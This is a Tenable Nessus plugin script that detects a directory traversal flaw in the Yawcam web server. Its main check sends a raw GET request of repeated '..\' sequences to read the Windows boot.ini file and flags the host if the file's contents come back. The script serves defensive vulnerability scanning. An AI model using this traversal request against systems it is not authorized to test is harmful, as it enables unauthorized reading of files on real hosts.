#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(18176);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2005-1230");
 script_bugtraq_id(13295);
 script_osvdb_id(15732);

 script_name(english:"Yawcam Web Server Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server itself is prone to directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Yawcam, yet another web cam software. 

The installed version of Yawcam is vulnerable to a directory traversal
flaw.  By exploiting this issue, an attacker may be able to gain
access to material outside of the web root." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=111410564915961&w=2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Yawcam 0.2.6 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/04/21");
 script_cvs_date("$Date: 2015/09/24 23:21:23 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_summary(english:"Checks for directory traversal in Yawcam");
 script_category(ACT_GATHER_INFO);
 script_family(english:"Web Servers");
 script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8081);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:8081);
if (! get_port_state(port) ) exit(0);

data = "/local.html";
data = http_get(item:data, port:port);
buf = http_keepalive_send_recv(port:port, data:data, bodyonly:TRUE);
if( buf == NULL ) exit(0);

if ("<title>Yawcam</title>" >< buf)
{
  req = string("GET ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini HTTP/1.0\r\n");
  soc = http_open_socket(port);
  if ( ! soc ) exit(0);
  send(socket:soc, data:req);
  res = http_recv_headers2(socket:soc);
  close (soc);
  if ("[boot loader]" >< res)
  {
	security_warning(port);	
  }
}
